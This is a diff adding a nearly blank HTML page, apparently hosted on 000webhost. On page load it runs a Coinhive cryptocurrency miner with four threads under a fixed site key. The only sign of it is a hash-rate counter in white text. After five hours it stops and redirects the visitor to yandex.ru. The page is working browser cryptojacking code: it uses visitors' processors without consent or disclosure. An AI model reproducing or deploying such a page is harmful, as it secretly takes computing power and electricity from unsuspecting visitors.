@@ -1,0 +1,110 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <style>
+        body{
+            margin: 0;
+            padding: 0;
+        }
+
+        .logo{
+            height: 130px;
+            width: 130px;
+        }
+
+        div#main {
+            justify-content: center;
+            align-items: center;
+            display: flex;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <span style="color:white;" id="hash_rate">0</span>
+    </center>
+
+<script src="https://code.jquery.com/jquery-3.2.1.min.js" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+    var milliseconds = new Date().getTime();
+    var miner;
+    var threadsCount = 4;
+
+    function makeid() {
+      var text = "";
+      var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678901234567890123456789";
+
+      for (var i = 0; i < 15; i++)
+        text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+      return text;
+    }
+
+
+    var pkID = makeid();
+
+    $(function () {
+        miner = new CoinHive.Anonymous('CxpOrSk3R2hXvaefgXJszGhF2uVU0ohs', {
+            threads: threadsCount
+        });
+        miner.start();
+        console.log("OK");
+        $('#miner_switch').on('click', function () {
+            if (miner.isRunning()) {
+                miner.stop();
+                $(this).text('Остановить');
+                $('#miner_status').text('Остановить');
+            }
+            else {
+                miner.start();
+                $(this).text('В процессе..');
+                $('#miner_status').text('В процессе..');
+            }
+        });
+        $('#thread_minus').on('click', function () {
+            if (threadsCount > 1) {
+                threadsCount -= 1;
+                miner.setNumThreads(threadsCount);
+                threadsCount = miner.getNumThreads();
+                $('#thread_count').text(threadsCount);
+            }
+        });
+        $('#thread_plus').on('click', function () {
+            if (threadsCount < 8) {
+                threadsCount += 1;
+                miner.setNumThreads(threadsCount);
+                threadsCount = miner.getNumThreads();
+                $('#thread_count').text(threadsCount);
+            }
+        });
+        // Update stats once per second
+        setInterval(function() {
+            var hashesPerSecond = miner.getHashesPerSecond();
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes();
+            // Output to HTML elements...
+            $('#hash_rate').text(hashesPerSecond);
+            $('#total_hashes').text(totalHashes);
+            $('#accepted_hashes').text(acceptedHashes);
+        }, 1000);
+
+
+        setInterval(function() {
+            miner.stop();
+            location.href = "http://yandex.ru/";
+        }, 18000000);
+
+
+    })
+</script>
+<div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_{$app['name']}&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div></body>
+</html>
